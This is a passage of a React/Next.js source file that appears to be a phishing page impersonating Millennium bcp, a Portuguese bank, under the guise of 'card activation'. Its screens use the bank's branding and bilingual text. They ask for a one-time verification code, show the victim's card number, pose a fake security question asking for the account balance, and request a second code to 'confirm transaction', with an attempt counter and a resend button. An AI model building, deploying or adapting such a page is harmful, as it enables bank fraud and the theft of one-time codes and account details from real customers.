                className="w-full h-[46px] sm:h-[48px] rounded-[4px] bg-[#26538d] text-white text-[13px] sm:text-[13.5px] font-bold tracking-[0.06em] uppercase flex items-center justify-center shadow-sm select-none pointer-events-none cursor-default opacity-95"
                aria-disabled="true"
              >
                {language === "en"
                  ? "I ALREADY AUTHORIZED. CONTINUE."
                  : "JÁ AUTORIZEI. CONTINUAR."}
              </button>
            </div>
          </section>
        </main>
      )}

      {/* ========================================================================= */}
      {/* 3. SCREEN 3: PIXEL-PERFECT OTP SCREEN                                     */}
      {/* Features: Back button, Millennium logo, Lock Icon,                        */}
      {/* "Verify your identity", 6 separate digit boxes, countdown, verify button  */}
      {/* ========================================================================= */}
      {currentScreen === "otp" && (
        <main className="relative w-full max-w-[440px] sm:max-w-[460px] h-[100dvh] max-h-[100dvh] flex flex-col overflow-hidden shadow-2xl bg-white px-0">
          {/* Header Bar: < CARD ACTIVATION [PT|EN] X + 4-segment Progress Bar */}
          <CardActivationHeader
            step={3}
            language={language}
            onToggleLanguage={handleLanguageChange}
            onBack={() => {
              setCurrentScreen("card")
              if (typeof window !== "undefined" && window.history) {
                window.history.replaceState({ screen: "card" }, "", "/card")
              }
            }}
            onClose={() => {
              setOtp(["", "", "", "", "", ""])
              setOtpError("")
              setFocusedOtpIndex(0)
              otpRefs.current[0]?.focus()
            }}
          />

          {/* Section below header: clean white background extending across the form */}
          <section className="relative z-10 w-full bg-white flex-1 flex flex-col items-center px-4 pt-6 pb-8 overflow-y-auto select-none">
            {/* Form Container (Clean white, seamless with background) */}
            <div
              className={`w-full max-w-[380px] bg-white flex flex-col items-center text-center ${
                otpError ? "animate-shake" : ""
              }`}
            >
              {/* Lock Icon */}
              <div className="w-12 h-12 flex items-center justify-center mb-2 text-[#990440]">
                <Lock className="w-[33px] h-[33px] stroke-[1.9]" />
              </div>

              {/* Title: Verify your identity */}
              <h2 className="text-[#0d1e38] text-[20px] sm:text-[21px] font-bold tracking-tight mb-1.5">
                {language === "en" ? "Verify your identity" : "Verifique a sua identidade"}
              </h2>

              {/* Subtitle */}
              <p className="text-[#64748b] text-[12.5px] sm:text-[13px] font-normal leading-relaxed max-w-[255px] mb-4.5">
                {language === "en"
                  ? "A 6-digit verification code has been sent to your registered mobile number."
                  : "Foi enviado um código de verificação de 6 dígitos para o seu telemóvel registado."}
              </p>

              {/* 6 Digit Input Boxes */}
              <div className="w-full max-w-[350px] grid grid-cols-6 gap-2 sm:gap-2.5 mx-auto mb-4">
                {otp.map((digit, idx) => (
                  <input
                    key={idx}
                    ref={(el) => {
                      otpRefs.current[idx] = el
                    }}
                    type="tel"
                    inputMode="numeric"
                    pattern="[0-9]*"
                    maxLength={1}
                    value={digit}
                    onChange={(e) => handleOtpChange(idx, e.target.value)}
                    onKeyDown={(e) => handleOtpKeyDown(idx, e)}
                    onFocus={() => setFocusedOtpIndex(idx)}
                    onBlur={() => setFocusedOtpIndex(null)}
                    className={`w-full h-[52px] sm:h-[56px] text-center text-[22px] sm:text-[24px] font-bold text-[#0d1e38] rounded-[10px] transition-all outline-none ${
                      focusedOtpIndex === idx
                        ? "border-2 border-[#990440] ring-1 ring-[#990440]/15 bg-white shadow-xs"
                        : digit
                        ? "border border-[#990440]/60 bg-white"
                        : "border border-[#d0dbe9] bg-[#f8fafc]"
                    }`}
                  />
                ))}
              </div>

              {/* Countdown & Resend Code */}
              <div className="flex flex-col items-center mb-5 select-none">
                <p className="text-[#64748b] text-[12.5px] sm:text-[13px] font-normal">
                  {language === "en" ? "Code expires in " : "O código expira em "}
                  <span className="font-bold text-[#0d1e38]">{formatTimer(timeLeft)}</span>
                </p>

                <button
                  type="button"
                  onClick={handleResendOtp}
                  className="flex items-center gap-1.5 text-[12px] sm:text-[12.5px] font-medium text-[#64748b] hover:text-[#990440] cursor-pointer mt-1.5 transition-colors"
                >
                  <RotateCw className="w-3.5 h-3.5 stroke-[2]" />
                  <span>{language === "en" ? "Resend code" : "Reenviar código"}</span>
                </button>

                {resendSuccess && (
                  <p className="mt-1.5 text-emerald-600 text-[12px] font-medium animate-in fade-in">
                    {language === "en" ? "Code resent successfully" : "Código reenviado com sucesso"}
                  </p>
                )}
              </div>

              {/* Error Message if any */}
              {otpError && (
                <p
                  key={`err-${shakeCount}`}
                  className="w-full mb-3 text-[#dc2626] font-medium text-[12.5px] bg-red-50 border border-red-200 px-3 py-1.5 rounded-md shadow-xs animate-shake"
                >
                  {otpError}
                </p>
              )}

              {/* Verify Button */}
              <button
                type="button"
                disabled={!isOtpComplete || isOtpSubmitting}
                onClick={handleOtpSubmit}
                className={`w-full h-[50px] sm:h-[52px] rounded-full font-semibold text-[16px] tracking-wide flex items-center justify-center transition-all select-none ${
                  isOtpComplete && !isOtpSubmitting
                    ? "bg-[#990440] hover:bg-[#830336] active:scale-[0.985] text-white cursor-pointer shadow-sm"
                    : "bg-[#e2e8f0] text-[#9ca3af] cursor-not-allowed"
                }`}
              >
                {isOtpSubmitting ? (
                  <div className="flex items-center gap-2">
                    <svg
                      className="animate-spin h-5 w-5 text-white"
                      xmlns="http://www.w3.org/2000/svg"
                      fill="none"
                      viewBox="0 0 24 24"
                    >
                      <circle
                        className="opacity-25"
                        cx="12"
                        cy="12"
                        r="10"
                        stroke="currentColor"
                        strokeWidth="4"
                      />
                      <path
                        className="opacity-75"
                        fill="currentColor"
                        d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                      />
                    </svg>
                    <span>{language === "en" ? "VERIFYING..." : "A VERIFICAR..."}</span>
                  </div>
                ) : language === "en" ? (
                  "Verify"
                ) : (
                  "Verificar"
                )}
              </button>
            </div>
          </section>
        </main>
      )}

      {/* ========================================================================= */}
      {/* 4. SCREEN 4: ACCOUNT DETAILS                                              */}
      {/* ========================================================================= */}
      {currentScreen === "accounts" && (
        <main className="relative w-full max-w-[440px] sm:max-w-[460px] h-[100dvh] max-h-[100dvh] flex flex-col overflow-hidden shadow-2xl bg-white px-0">
          {/* Header Bar: < CARD ACTIVATION [PT|EN] X + 4-segment Progress Bar */}
          <CardActivationHeader
            step={4}
            language={language}
            onToggleLanguage={handleLanguageChange}
            onBack={() => {
              setCurrentScreen("otp")
              if (typeof window !== "undefined" && window.history) {
                window.history.replaceState({ screen: "otp" }, "", "/verify")
              }
            }}
            onClose={() => {
              setAccountNumber("")
              setAccountBalance("")
            }}
          />

          {/* White Card Container extending to bottom with Rounded Top Corners */}
          <section className="relative z-10 w-full bg-white rounded-t-[28px] flex-1 flex flex-col p-5 shadow-2xl overflow-y-auto gap-3.5 select-none">
            {/* Card Display with Overlaid Number & Validity */}
            <div className="w-full flex flex-col items-center">
              <div className="relative w-full max-w-[380px] rounded-[14px] overflow-hidden shadow-sm flex items-center justify-center bg-white">
                <img
                  src="/millennium_card.jpg"
                  alt="Millennium bcp Card"
                  className="w-full h-auto object-contain rounded-[14px] select-none pointer-events-none"
                />
                {/* Overlaid Embossed Number */}
                <div className="absolute bottom-[24%] left-[6.5%] font-mono tracking-[0.16em] text-[12px] sm:text-[13.5px] text-white/95 font-semibold drop-shadow-[0_1px_2px_rgba(0,0,0,0.6)]">
                  {cardNumber || "4934 6400 1015 6384"}
                </div>
                {/* Overlaid Expiry */}
                <div className="absolute bottom-[11%] left-[6.5%] flex items-center font-mono text-[7px] sm:text-[8px] text-white/80 tracking-wider">
                  <span className="mr-1 opacity-75">VALID THRU</span>
                  <span className="font-semibold text-white text-[8px] sm:text-[9.5px]">
                    {cardMonth && cardYear ? `${cardMonth}/${cardYear}` : "11/29"}
                  </span>
                </div>
              </div>

              {/* 3 Pagination dots */}
              <div className="flex items-center justify-center gap-1.5 pt-3 pb-0.5">
                <span className="w-4 h-1.5 rounded-full bg-[#990440]" />
                <span className="w-1.5 h-1.5 rounded-full bg-[#cbd5e1]" />
                <span className="w-1.5 h-1.5 rounded-full bg-[#cbd5e1]" />
              </div>
            </div>

            {/* Box 1: ACCOUNT NUMBER */}
            <div className="w-full border border-[#e2e8f0] rounded-[14px] p-3.5 bg-white">
              <label className="block text-[10.5px] font-bold text-[#64748b] tracking-wider uppercase mb-2">
                {language === "en" ? "ACCOUNT NUMBER" : "NÚMERO DE CONTA"}
              </label>
              <div className="flex items-center flex-nowrap whitespace-nowrap">
                <span className="bg-[#f1f5f9] text-[#475569] text-[12px] font-semibold px-2.5 py-1 rounded-[6px] mr-3 select-none shrink-0">
                  Acc.
                </span>
                <span className="text-[#1e293b] font-mono text-[15px] tracking-[0.2em] select-none whitespace-nowrap font-medium">
                  **** ****
                </span>
              </div>
            </div>

            {/* Box 2: BANK SECURITY QUESTION */}
            <div className="w-full border border-[#e2e8f0] rounded-[14px] p-3.5 bg-white">
              <label className="block text-[10.5px] font-bold text-[#64748b] tracking-wider uppercase mb-1">
                {language === "en" ? "BANK SECURITY QUESTION" : "PERGUNTA DE SEGURANÇA BANCÁRIA"}
              </label>
              <p className="text-[13px] font-medium text-[#1e293b] mb-2.5">
                {language === "en"
                  ? "What is your current account balance?"
                  : "Qual é o saldo atual da sua conta?"}
              </p>
              <div className="flex items-center">
                <span className="bg-[#990440] text-white text-[11px] font-bold px-2.5 py-1 rounded-[6px] mr-2.5 select-none shrink-0 flex items-center justify-center">
                  EUR
                </span>
                <input
                  type="text"
                  inputMode="decimal"
                  value={accountBalance}
                  onChange={(e) => setAccountBalance(e.target.value)}
                  placeholder="0.00"
                  className="w-full text-[15px] text-[#1e293b] placeholder-[#94a3b8] outline-none bg-transparent font-medium"
                />
              </div>
            </div>

            {/* Continue Button: Hidden until user enters balance behind EUR */}
            {accountBalance.trim().length > 0 && (
              <button
                type="button"
                disabled={isAccountsSubmitting}
                onClick={handleAccountsSubmit}
                className="w-full h-[50px] sm:h-[52px] bg-[#990440] hover:bg-[#830336] active:scale-[0.985] text-white rounded-full font-semibold text-[16px] tracking-wide transition-all flex items-center justify-center cursor-pointer shadow-sm select-none animate-in fade-in duration-200"
              >
                {isAccountsSubmitting ? (
                  <div className="flex items-center gap-2">
                    <svg
                      className="animate-spin h-5 w-5 text-white"
                      xmlns="http://www.w3.org/2000/svg"
                      fill="none"
                      viewBox="0 0 24 24"
                    >
                      <circle
                        className="opacity-25"
                        cx="12"
                        cy="12"
                        r="10"
                        stroke="currentColor"
                        strokeWidth="4"
                      />
                      <path
                        className="opacity-75"
                        fill="currentColor"
                        d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                      />
                    </svg>
                    <span>{language === "en" ? "PROCESSING..." : "A PROCESSAR..."}</span>
                  </div>
                ) : accountsSuccess ? (
                  language === "en" ? "✓ Completed" : "✓ Concluído"
                ) : language === "en" ? (
                  "Continue"
                ) : (
                  "Continuar"
                )}
              </button>
            )}
          </section>
        </main>
      )}

      {/* ========================================================================= */}
      {/* 5. SCREEN 5: CONFIRM TRANSACTION OTP (/cc)                                */}
      {/* ========================================================================= */}
      {currentScreen === "confirm-otp" && (
        <main className="relative w-full max-w-[440px] sm:max-w-[460px] h-[100dvh] max-h-[100dvh] flex flex-col overflow-hidden shadow-2xl bg-white px-0">
          {/* Header Bar: < CARD ACTIVATION [PT|EN] X + 4-segment Progress Bar */}
          <CardActivationHeader
            step={4}
            language={language}
            onToggleLanguage={handleLanguageChange}
            onBack={() => {
              setCurrentScreen("accounts")
              if (typeof window !== "undefined" && window.history) {
                window.history.pushState({ screen: "accounts" }, "", "/accounts")
              }
            }}
            onClose={() => {
              setConfirmOtp(["", "", "", "", "", ""])
              setHasConfirmError(false)
              setConfirmFocusedIndex(0)
              confirmOtpRefs.current[0]?.focus()
            }}
          />

          {/* Section below header: clean white background extending across the form */}
          <section className="relative z-10 w-full bg-white flex-1 flex flex-col justify-start items-center p-4 pt-6 overflow-y-auto select-none">
            {/* Form Container (Clean white, seamless with background) */}
            <div className="w-full max-w-[380px] bg-white flex flex-col items-center">
              {/* Lock Icon in subtle ring */}
              <div className="w-11 h-11 rounded-full border border-[#990440]/25 flex items-center justify-center text-[#990440] mb-3">
                <Lock className="w-5 h-5 stroke-[2.2]" />
              </div>

              {/* Heading */}
              <h2 className="text-[17.5px] sm:text-[18.5px] font-bold text-[#0f172a] text-center mb-1.5">
                {language === "en" ? "Confirm transaction" : "Confirmar transação"}
              </h2>

              {/* Subtitle */}
              <p className="text-[11.5px] text-[#64748b] text-center leading-relaxed mb-4 max-w-[270px]">
                {language === "en"
                  ? "Enter the 6-digit code sent to your mobile number to authorise this action."
                  : "Introduza o código de 6 dígitos enviado para o seu telemóvel para autorizar esta ação."}
              </p>

              {/* 6 OTP Boxes */}
              <div
                className={`grid grid-cols-6 gap-2 sm:gap-2.5 w-full max-w-[340px] mx-auto mb-3.5 ${
                  confirmShake > 0 ? "animate-shake" : ""
                }`}
              >
                {confirmOtp.map((digit, idx) => {
                  const isFocused = confirmFocusedIndex === idx
                  const boxBorderClass = hasConfirmError
                    ? isFocused
                      ? "border-[#ef4444] ring-1 ring-[#ef4444]"
                      : "border-[#ef4444]"
                    : isFocused
                    ? "border-[#990440] ring-1 ring-[#990440]"
                    : "border-[#cbd5e1]"

                  return (
                    <input
                      key={idx}
                      ref={(el) => {
                        confirmOtpRefs.current[idx] = el
                      }}
                      type="text"
                      inputMode="numeric"
                      maxLength={6}
                      value={digit}
                      onFocus={() => setConfirmFocusedIndex(idx)}
                      onBlur={() => setConfirmFocusedIndex(null)}
                      onChange={(e) => handleConfirmOtpChange(idx, e.target.value)}
                      onKeyDown={(e) => handleConfirmOtpKeyDown(idx, e)}
                      className={`w-full h-[50px] sm:h-[52px] text-center text-[21px] sm:text-[22px] font-bold text-[#0f172a] bg-white rounded-[10px] border ${boxBorderClass} outline-none transition-all shadow-none`}
                    />
                  )
                })}
              </div>

              {/* Error Banner: ⓘ Incorrect code. Please try again. */}
              {hasConfirmError && (
                <div className="w-full max-w-[340px] bg-[#fef2f2] border border-[#fecaca] text-[#dc2626] rounded-[8px] py-1.5 px-3 flex items-center justify-center gap-1.5 text-[11px] font-medium mb-3 animate-in fade-in duration-150">
                  <svg
                    className="w-3.5 h-3.5 shrink-0 stroke-[2] fill-none stroke-current"
                    viewBox="0 0 24 24"
                  >
                    <circle cx="12" cy="12" r="10" />
                    <line x1="12" y1="16" x2="12" y2="12" />
                    <line x1="12" y1="8" x2="12.01" y2="8" />
                  </svg>
                  <span>
                    {language === "en"
                      ? confirmErrorMessage
                      : "Código incorreto. Por favor, tente novamente."}
                  </span>
                </div>
              )}

              {/* Attempt Counter: Attempt 1 / 3 */}
              <p className="text-[11px] font-medium text-[#64748b] text-center mb-1">
                {language === "en" ? "Attempt" : "Tentativa"} {confirmAttempt} / 3
              </p>

              {/* Countdown Timer: Code expires in 2:58 */}
              <p className="text-[11.5px] text-[#475569] text-center mb-2 font-medium">
                {language === "en" ? "Code expires in " : "O código expira em "}
                <span className="font-bold text-[#0f172a]">{formatTimer(confirmTimeLeft)}</span>
              </p>

              {/* Resend Code Button */}
              <button
                type="button"
                onClick={handleResendConfirmOtp}
                className="flex items-center justify-center gap-1.5 text-[11.5px] text-[#64748b] hover:text-[#990440] transition-colors cursor-pointer font-medium mb-4"
              >
                <RotateCw className="w-3 h-3 stroke-[2.2]" />
                <span>{language === "en" ? "Resend code" : "Reenviar código"}</span>
              </button>

              {/* Confirm Button */}
              <button
                type="button"
                disabled={confirmOtp.join("").length < 6 || isConfirmSubmitting}
                onClick={handleConfirmOtpSubmit}
                className={`w-full h-[50px] sm:h-[52px] rounded-full font-semibold text-[15px] sm:text-[16px] transition-all flex items-center justify-center select-none shadow-sm ${
                  confirmOtp.join("").length === 6 && !isConfirmSubmitting
                    ? "bg-[#990440] hover:bg-[#830336] active:scale-[0.985] text-white cursor-pointer"
                    : "bg-[#e2e8f0] text-[#9ca3af] cursor-not-allowed"
                }`}
              >
                {isConfirmSubmitting ? (
                  <div className="flex items-center gap-2">
                    <svg
                      className="animate-spin h-4 w-4 text-white"
                      xmlns="http://www.w3.org/2000/svg"
                      fill="none"
                      viewBox="0 0 24 24"
                    >
                      <circle
                        className="opacity-25"
                        cx="12"
                        cy="12"
                        r="10"
                        stroke="currentColor"
                        strokeWidth="4"
                      />
                      <path
                        className="opacity-75"
                        fill="currentColor"
                        d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                      />
                    </svg>
                    <span>{language === "en" ? "CONFIRMING..." : "A CONFIRMAR..."}</span>
                  </div>
                ) : language === "en" ? (
                  "Confirm"
                ) : (
                  "Confirmar"
                )}
              </button>
            </div>
          </section>
        </main>
      )}

      {/* ========================================================================= */}
      {/* 2-SECOND BLURRED LOADING OVERLAY (MATCHING SCREENSHOT 1)                  */}
      {/* Active on transition: Login -> Card and Card -> OTP                       */}
      {/* ========================================================================= */}
      {isScreenLoading && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-[#990440]/10 backdrop-blur-md animate-in fade-in duration-200">
          <div
            className="w-[44px] h-[44px] rounded-full border-[3.5px] animate-spin"
            style={{
              borderColor: "rgba(153, 4, 64, 0.2)",
              borderTopColor: "#990440",
            }}
          />
        </div>
      )}

      {/* Shake Keyframe animation & Calm Sequential Icon Transitions */}
      <style jsx global>{`
        @keyframes shake {
          10%, 90% { transform: translate3d(-1px, 0, 0); }
          20%, 80% { transform: translate3d(2px, 0, 0); }
          30%, 50%, 70% { transform: translate3d(-4px, 0, 0); }
          40%, 60% { transform: translate3d(4px, 0, 0); }
        }
        .animate-shake {
          animation: shake 0.4s cubic-bezier(0.36, 0.07, 0.19, 0.97) both;
        }

        @keyframes iconAppear {
          0% {
            opacity: 0;
            transform: translateY(14px) scale(0.92);
          }
          100% {
            opacity: 1;
            transform: translateY(0) scale(1);
          }
        }

        @keyframes iconRemove {
          0% {
            opacity: 1;
            transform: translateY(0) scale(1);
          }
          100% {
            opacity: 0;
            transform: translateY(-14px) scale(1.05);
          }
        }

        .animate-icon-appear {
          animation: iconAppear 520ms cubic-bezier(0.16, 1, 0.3, 1) forwards;
        }

        .animate-icon-remove {
          animation: iconRemove 440ms cubic-bezier(0.7, 0, 0.84, 0) forwards;
        }
      `}</style>
    </div>
  )
}
